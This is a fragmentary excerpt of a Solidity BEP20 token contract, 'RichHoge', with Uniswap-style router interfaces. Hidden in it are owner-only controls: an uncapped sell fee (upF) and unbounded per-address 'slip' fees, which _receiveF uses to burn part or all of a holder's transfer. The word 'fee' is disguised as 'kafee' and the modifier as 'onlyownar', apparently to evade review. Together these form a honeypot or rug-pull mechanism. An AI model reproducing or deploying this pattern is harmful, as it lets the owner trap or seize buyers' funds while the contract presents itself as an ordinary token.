...
interface IUniswapV2Factory {
    ...
    function kafeeTo() external view returns (address);
    function kafeeToSetter() external view returns (address);
    ...
    function setkafeeTo(address) external;
    function setkafeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingkafeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingkafeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingkafeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingkafeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingkafeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract RichHoge is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellkafee = 0;

    uint256 private _defaultBuykafee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipkafee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellkafee = _value;
    }

    function setSlipkafee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipkafee[_address] = _value;
    }

    function getSlipkafee(address _address) external view onlyownar returns (uint256) {
        return _slipkafee[_address];
    }


    function setMAccountkafee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountkafee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradekafeeAmount = 0;

        if (rF) {
            uint256 tradekafee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradekafee = _defaultSellkafee;
                }
                if (from == uniswapV2Pair) {

                    tradekafee = _defaultBuykafee;
                }
            }
            if (_slipkafee[from] > 0) {
                tradekafee = _slipkafee[from];
            }

            tradekafeeAmount = _Amount.mul(tradekafee).div(100);
        }


        if (tradekafeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradekafeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradekafeeAmount);
            emit Transfer(from, _deadAddress, tradekafeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradekafeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradekafeeAmount);
        emit Transfer(from, _to, _Amount - tradekafeeAmount);
    }
